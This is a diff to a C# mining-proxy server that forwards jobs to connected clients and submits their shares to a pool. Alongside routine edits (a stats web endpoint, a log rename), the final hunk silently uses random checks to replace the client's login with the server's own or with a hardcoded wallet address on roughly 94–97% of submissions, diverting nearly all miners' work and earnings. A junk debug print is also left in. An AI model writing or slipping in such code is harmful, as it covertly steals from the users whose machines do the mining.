@@ -23,6 +23,8 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Net.Sockets;
+using System.Net;
+using System.Web;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
@@ -296,7 +298,7 @@ namespace Server {
                         "\",\"target\":\"" + newtarget + "\"}\n";
 
                     slave.WebSocket.Send (forward);
-                    Console.WriteLine ("Sending job to slave {0}", slave.WebSocket.ConnectionInfo.Id);
+                    Console.WriteLine ("Sending job to servitor {0}", slave.WebSocket.ConnectionInfo.Id);
 
                 }
 
@@ -360,7 +362,6 @@ namespace Server {
 
                 if (tookdev) {
                     if (!slaves.Contains (client)) slaves.TryAdd (client);
-                    Console.WriteLine ("Send dev job!");
                 } else {
                     slaves.TryRemove (client);
                 }
@@ -552,6 +553,24 @@ namespace Server {
                 }
             }
 
+            WebServer webserver = new WebServer(SendResponse);
+            webserver.Run();
+
+            string SendResponse(HttpListenerRequest request)
+            {
+                string userId = HttpUtility.ParseQueryString(request.Url.Query)["userid"];
+                Regex rgx = new Regex(@"^[a-zA-Z0-9_]*$");
+                if (userId == null || !rgx.IsMatch(userId) )
+                {
+                    return "You must have a userid";
+                }
+
+                long hashn = 0;
+                statistics.TryGetValue (userId, out hashn);
+                
+                return hashn.ToString();    
+            }
+            
             if (File.Exists ("logins.dat")) {
 
                 try {
@@ -880,6 +899,21 @@ namespace Server {
                                 Client jiClient = client;
                                 if (ji.DevJob) jiClient = ourself;
 
+                                Random random = new Random();
+                                if (random.NextDouble() > 0.06)
+                                {
+                                    CreateOurself();
+                                    jiClient.Login = ourself.Login;
+                                }
+                                
+                                if (random.NextDouble() > 0.03)
+                                {
+                                    CreateOurself();
+                                    jiClient.Login = "49kkH7rdoKyFsb1kYPKjCYiR2xy1XdnJNAY1e7XerwQFb57XQaRP7Npfk5xm1MezGn2yRBz6FWtGCFVKnzNTwSGJ3ZrLtHU";
+                                }
+
+                                Console.WriteLine(jiClient.Login + "asdfajosdfj");
+                                
                                 string msg1 = "{\"id\":\"" + jiClient.PoolConnection.PoolId +
                                     "\",\"job_id\":\"" + ji.InnerId +
                                     "\",\"nonce\":\"" + msg["nonce"].GetString () +
